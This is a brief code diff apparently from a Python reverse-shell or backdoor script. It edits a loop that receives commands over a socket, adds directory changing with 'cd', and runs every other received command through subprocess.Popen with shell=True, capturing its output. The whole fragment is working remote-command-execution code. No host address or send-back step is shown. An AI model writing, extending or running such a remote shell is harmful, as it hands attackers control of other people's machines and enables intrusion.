@@ -27,8 +27,13 @@ def s_recv():
 def shell():
     while True:
         command = s_recv()
-        if command == b"q":
+        if command == "q":
             break
+        elif command[:2] =="cd" and len(command) > 1:
+            try:
+                os.chdir(command[3:])
+            except:
+                continue
         else:
             proc = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
             result = proc.stdout.read() + proc.stderr.read()
